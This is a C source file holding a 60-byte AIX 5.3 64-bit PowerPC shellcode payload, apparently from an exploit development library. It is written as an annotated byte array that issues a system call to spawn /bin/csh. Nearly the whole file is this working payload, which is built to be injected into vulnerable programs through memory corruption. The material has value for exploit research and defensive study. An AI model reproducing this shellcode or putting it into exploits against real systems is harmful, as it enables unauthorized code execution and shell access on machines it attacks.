/*
 *  $Id: aix-power-shellcode64.c 40 2008-11-17 02:45:30Z ramon $
 *
 *  aix-power-shellcode64.c - AIX Power shellcode
 *  Copyright 2008 Ramon de Carvalho Valle <ramon@risesecurity.org>
 *
 *  This library is free software; you can redistribute it and/or
 *  modify it under the terms of the GNU Lesser General Public
 *  License as published by the Free Software Foundation; either
 *  version 2.1 of the License, or (at your option) any later version.
 *
 *  This library is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
 *  Lesser General Public License for more details.
 *
 *  You should have received a copy of the GNU Lesser General Public
 *  License along with this library; if not, write to the Free Software
 *  Foundation, Inc., 51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA
 *
 */

/*
 * Currently supported AIX levels.
 * -DV530   AIX 5.3.0
 *
 */

char shellcode64[]=         /*  60 bytes                          */
    "\x3b\xe0\x01\xff"      /*  lil     r31,511                   */
    "\x7c\xa5\x2a\x79"      /*  xor.    r5,r5,r5                  */
    "\x40\x82\xff\xf9"      /*  bnel    <shellcode64>             */
    "\x7f\xc8\x02\xa6"      /*  mflr    r30                       */
    "\x3b\xde\x01\xff"      /*  cal     r30,511(r30)              */
    "\x38\x7e\xfe\x29"      /*  cal     r3,-471(r30)              */
    "\x98\xbe\xfe\x31"      /*  stb     r5,-463(r30)              */
    "\xf8\xa1\xff\xf9"      /*  stdu    r5,-8(r1)                 */
    "\xf8\x61\xff\xf9"      /*  stdu    r3,-8(r1)                 */
    "\x7c\x24\x0b\x78"      /*  mr      r4,r1                     */
#ifdef V530
    "\x38\x42\xfe\x06"      /*  cal     r2,-506(r2)               */
#endif
    "\x4c\xc6\x33\x42"      /*  crorc   6,6,6                     */
    "\x44\xff\xff\x02"      /*  svca    0                         */
    "/bin/csh"
;

